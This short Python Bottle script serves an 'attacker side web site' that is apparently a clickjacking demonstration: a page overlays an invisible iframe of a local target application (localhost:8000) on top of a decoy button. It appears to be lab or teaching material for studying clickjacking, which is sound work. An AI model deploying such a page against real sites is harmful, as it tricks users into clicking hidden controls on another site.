#!/usr/bin/python
# -*- coding: utf-8 -*-

from bottle import route
from bottle import run


@route('/')
def hello():
    target_url = 'http://localhost:8000'
    html = '<h2> attacker side web site </h2>'
    html += '<iframe '
    html += 'style="opacity:0;filter:alpha(opacity=0)" '
    html += 'src="{}">'.format(target_url)
    html += '</iframe>'
    html += '<button '
    html += 'style="position:absolute;top:120;left:40;z-index:-1">'
    html += 'button</button>'
    return html


def main():
    run(host='localhost', port=8888, debug=True)


if __name__ == '__main__':
    main()
